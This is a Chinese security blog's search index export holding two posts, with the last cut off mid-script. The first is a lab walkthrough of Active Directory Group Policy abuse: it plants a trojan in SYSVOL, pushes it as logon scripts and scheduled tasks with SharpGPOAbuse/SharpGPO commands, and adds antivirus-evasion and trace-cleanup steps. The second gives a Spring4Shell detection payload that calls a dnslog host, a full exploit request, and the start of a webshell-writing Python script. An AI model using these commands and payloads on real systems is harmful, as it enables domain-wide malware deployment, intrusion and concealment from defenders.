<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>域渗透实战下-gpo策略利用</title>
      <link href="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/"/>
      <url>/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h2><p><strong><a href="https://redn3ck.github.io/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/">https://redn3ck.github.io/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/</a></strong></p><p><strong><a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></strong></p><p><strong><a href="http://www.ttk7.cn/post-136.html">http://www.ttk7.cn/post-136.html</a></strong></p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a><strong>注意点</strong></h2><p><strong>计划任务  每次需要删除计划的配置文件 ，更改任务名 重新下发文件,计划任务的文件路径放在sysvol目录下</strong></p><p><strong>startup 重启登录  文件必须放在 gpo配置的指定目录下</strong></p><p><strong>如果有修改sysvol的权限 可以尝试替换 Startup 以及 计划任务的配置文件</strong></p><h2 id="Gpp策略"><a href="#Gpp策略" class="headerlink" title="Gpp策略"></a><strong>Gpp策略</strong></h2><p><strong>域内的组策略，在创建gpo之后，可以设置 执行命令的功能，适用于在有适当的域控制权限针对特定目标机器进行执行命令或者批量下发命令的功能</strong></p><p><strong>所有的域策略保存在</strong> </p><p><strong>SYSVOL</strong></p><p><strong>解决办法之一是为认证数据采取SYSVOL，SYSVOL是AD（活动目录）里面一个存储域公共文件服务器副本的共享文件夹，所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\&lt;domain&gt;\SYSVOL\&lt;domain&gt;\Policies\&lt;/domain&gt;&lt;/domain&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dc1</span><br><span class="line">windows7</span><br></pre></td></tr></table></figure><h2 id="SYSVOL下存放的域策略配置"><a href="#SYSVOL下存放的域策略配置" class="headerlink" title="SYSVOL下存放的域策略配置"></a><strong>SYSVOL下存放的域策略配置</strong></h2><p><strong>SYSVOL 下可能会存放密码策略，本地管理员账户，网站账户的一些策略配置，在权限拓展失败的情况下可以尝试翻阅SYSVOL下的目录可能会有域内的一些配置脚本保存信息</strong></p><h3 id><a href="#" class="headerlink" title></a><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407131747903.png" alt="image-20220407131747903"></strong></h3><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407132105498.png" alt="image-20220407132105498"></strong></p><p><strong>User （Ou组内用户登录后相关脚本进行的命令执行）</strong></p><p><strong>Machine (机器重启运行后相关脚本进行的命令执行)</strong></p><h2 id="登录域控通过域策略进行命令执行"><a href="#登录域控通过域策略进行命令执行" class="headerlink" title="登录域控通过域策略进行命令执行"></a><strong>登录域控通过域策略进行命令执行</strong></h2><h3 id="新建OU"><a href="#新建OU" class="headerlink" title="新建OU"></a><strong>新建OU</strong></h3><p><strong>新建OU 添加目标机器，或者用户，这里我以受害机器 windows7  用户 zhu 进行演示</strong></p><p><strong>新建组织单位 信息部</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407132627484.png" alt="image-20220407132627484"></strong></p><p><strong>将原技术部 zhu  以及用户计算机移动到Ou信息部下</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407132847253.png" alt="image-20220407132847253"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407132958098.png" alt="image-20220407132958098"></strong></p><p><strong>运行gpmc.msc 进行组策略配置</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133111505.png" alt="image-20220407133111505"></strong></p><p><strong>在这个域中创建gpo 我们命名gptest</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133148655.png" alt="image-20220407133148655"></strong></p><p><strong>在 gptest 右键编辑</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133305492.png" alt="image-20220407133305492"></strong></p><p><strong>我们来设置登录脚本</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133339125.png" alt="image-20220407133339125"></strong></p><p><strong>这里我们以用户进行配置 -》Windows设置-》脚本登录</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133437331.png" alt="image-20220407133437331"></strong></p><p><strong>点击显示文件，将生成的木马 放入显示文件的目录里，然后点击添加脚本就行</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133542557.png" alt="image-20220407133542557"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133818172.png" alt="image-20220407133818172"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407133840538.png" alt="image-20220407133840538"></strong></p><p><strong>组策略创建好后然后在ou右键选择链接到现有的GPO</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407134516884.png" alt="image-20220407134516884"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407134627539.png" alt="image-20220407134627539"></strong></p><p><strong>我们在域控刷新一下域策略在windows7机器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Invoke-GPUpdate -Computer windows7.kdc.com -RandomDelayInMinutes 0</span><br></pre></td></tr></table></figure><p><strong>重启登录受害用户</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407134223811.png" alt="image-20220407134223811"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407135100378.png" alt="image-20220407135100378"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407135127655.png" alt="image-20220407135127655"></strong></p><h3 id="计划任务执行"><a href="#计划任务执行" class="headerlink" title="计划任务执行"></a><strong>计划任务执行</strong></h3><p><strong>这种方法在组策略不需要用户重启电脑在Startup过程中执行任务，直接在运行过程中刷新组策略即可</strong></p><p><strong>具体方法在组策略里的用户配置-》首选项-》控制面板-》计划任务</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407135449573.png" alt="image-20220407135449573"></strong></p><p><strong>这里就不演示了，需要注意的是执行路径，需要受害机器能够访问到</strong></p><h2 id="不登录进行组策略下发执行"><a href="#不登录进行组策略下发执行" class="headerlink" title="不登录进行组策略下发执行"></a><strong>不登录进行组策略下发执行</strong></h2><p><strong>使用工具如下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FSecureLABS/SharpGPOAbuse</span><br><span class="line">https://github.com/Dliv3/SharpGPO</span><br></pre></td></tr></table></figure><p><strong>具体用法参照 readme ,落地注意免杀</strong></p><p><strong>新建ou</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action NewOU --OUName &quot;IT&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407140220034.png" alt="image-20220407140220034"></strong></p><p><strong>移动信息部下x用户到IT组下面</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action MoveObject --SrcDN &quot;CN=x,OU=信息部,DC=kdc,DC=com&quot; --DstDN &quot;OU=IT,DC=kdc,DC=com&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407144113272.png" alt="image-20220407144113272"></strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407144204392.png" alt="image-20220407144204392"></strong></p><p><strong>再将Administrators电脑移动到IT组下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action MoveObject --SrcDN &quot;CN=administrator,OU=技术部,DC=kdc,DC=com&quot; --DstDN &quot;OU=IT,DC=kdc,DC=com&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407152858750.png" alt="image-20220407152858750"></strong></p><p><strong>创建GPo  pergpo</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action NewGPO --GPOName pergpo</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407144725035.png" alt="image-20220407144725035"></strong></p><p><strong>sysvol下会出现策略配置信息</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407144810105.png" alt="image-20220407144810105"></strong></p><p><strong>现在我们添加一个计划任务 来使目标机器或者用户上线</strong></p><p><strong>由于目标机器执行计划任务是以本地文件路径执行，所以我们要把木马文件放置在 目标机器可以访问的目录,sysvol目录是域内机器都可以访问到的目录我们可以把木马放置在该目录下</strong></p><p><strong>\kdc.com\SysVol\kdc.com\scripts</strong> </p><p><strong>注：执行时需要<code>cmd /c start</code>否则开机会有cmd窗口</strong></p><p><strong>添加用户计划任务</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGPOAbuse.exe --AddUserTask --TaskName &quot;tu&quot; --Author DOMAIN\Admin --Command &quot;cmd.exe&quot; --Arguments &quot;/c start \\dc1\\SysVol\\kdc.com\\scripts\\artifact.exe&quot; --GPOName &quot;pergpo&quot;</span><br></pre></td></tr></table></figure><p><strong>添加机器计划任务</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;tu&quot; --Author DOMAIN\Admin --Command &quot;cmd.exe&quot; --Arguments &quot;/c start \\dc1\\SysVol\\kdc.com\\scripts\\artifact.exe&quot; --GPOName &quot;pergpo&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407155259864.png" alt="image-20220407155259864"></strong></p><p><strong>(注意这里 计划任务会在sysvol目录下存放一个计划任务配置的xml,每次换新的计划任务时需要删除掉此gpo下的计划配置文件。并重新下发计划任务，并重新更换任务名)</strong></p><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407152556068.png" alt="image-20220407152556068"></strong></p><p><strong>将GPlink 链接到目标ou下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action NewGPLink --DN &quot;OU=IT,DC=kdc,DC=com&quot; --GPOName pergpo</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407153317361.png"></strong></p><p><strong>刷新域策略上线</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Invoke-GPUpdate -Computer dc1.kdc.com -RandomDelayInMinutes 0</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407155714675.png" alt="image-20220407155714675"></strong></p><h2 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a><strong>清理痕迹</strong></h2><p><strong>删除gplink 链接</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGPO.exe --Action RemoveGPLink --DN &quot;OU=IT,DC=kdc,DC=com&quot; --GPOName pergpo</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407160108653.png" alt="image-20220407160108653"></strong></p><p><strong>删除gpo 或者可以直接删除sysvol 目录下</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGPO.exe --Action RemoveGPO --GPOName pergpo</span><br></pre></td></tr></table></figure><p><strong>移动ou 到原来目录 x administrator  科技部</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action MoveObject --SrcDN &quot;CN=Administrator,OU=IT,DC=kdc,DC=com&quot; --DstDN &quot;OU=技术部,DC=kdc,DC=com&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407160836202.png" alt="image-20220407160836202"></strong></p><p><strong>删除ou IT</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGpo.exe --Action RemoveOU --OUName &quot;IT&quot;</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407161003371.png" alt="image-20220407161003371"></strong></p><h2 id="end"><a href="#end" class="headerlink" title="end"></a><strong>end</strong></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring-shell 简析</title>
      <link href="/2022/04/05/spring-shell/spring-shell/"/>
      <url>/2022/04/05/spring-shell/spring-shell/</url>
      
        <content type="html"><![CDATA[<h2 id="spring-shell-简析"><a href="#spring-shell-简析" class="headerlink" title="spring-shell 简析"></a>spring-shell 简析</h2><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>tomcat-web-inf  检测是否存在302</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.mapperDirectoryRedirectEnabled=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>默认WEB_INF 页面访问是404</strong></p><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406111419548.png" alt="image-20220406111419548"></p><p><strong>发送poc</strong></p><p>&#x2F;WEB-INF</p><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406111310558.png" alt="image-20220406111310558"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.configFile=http:<span class="comment">//xxx</span></span><br><span class="line">x.dnslog.cn/t&amp;class.<span class="keyword">module</span>.classLoader.resources.context.configF</span><br><span class="line">ile.content.aaa=xxx</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /? HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Content-Length: 153</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1:8080</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://127.0.0.1:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">class.module.classLoader.resources.context.configFile=http://sss.29qlpu.dnslog.cn/t&amp;class.module.classLoader.resources.context.configFile.content.aaa=xxx</span><br></pre></td></tr></table></figure><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406111715171.png" alt="image-20220406111715171"></p><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406111726230.png" alt="image-20220406111726230"></p><h2 id="漏洞利用-更改tomcat日志配置文件写shell"><a href="#漏洞利用-更改tomcat日志配置文件写shell" class="headerlink" title="漏洞利用 更改tomcat日志配置文件写shell"></a>漏洞利用 更改tomcat日志配置文件写shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 